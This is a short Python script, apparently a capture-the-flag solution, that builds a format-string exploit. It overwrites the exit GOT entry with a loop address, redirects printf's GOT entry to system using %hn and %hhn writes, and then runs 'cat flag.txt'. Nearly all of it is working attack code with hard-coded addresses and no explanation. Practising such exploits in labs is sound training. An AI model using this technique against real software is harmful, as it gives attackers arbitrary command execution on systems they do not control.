import struct

LOOP = 0x4009bd
EXIT_GOT = 0x601258
PRINTF_GOT = 0x601220
SYSTEM = 0x7ffff7a72490
EXECVE = 0x7ffff7aeb310

def pad(s):
    return s + "X"*(1024 - len(s))

# put address of EXIT_PLT on stack
exploit = ""
exploit += "AAAABBBBCCCCDDDDEEEEFFFF"

#17$->24$
for i in range(0, 8, 1):
    exploit += struct.pack("Q", EXIT_GOT + i);
    
# write to exit got entry the value of loop pointer
exploit += "\ne "
exploit += "%2493x%17$hn"

exploit += "\n" + "AAAABBBBCCCCDDDDEEEEFFFF"*8

for i in range(0, 9, 1):
    exploit += struct.pack("Q", 0x0);
    exploit += struct.pack("Q", PRINTF_GOT + i);


# write to printf the address for system
exploit += "\ne "

# these 3 remap printf to system
exploit += "%144x%39$hhn"
exploit += "%148x%41$hhn"
exploit += "%131x%43$hhn"


exploit += "\ne cat flag.txt\n"

print exploit
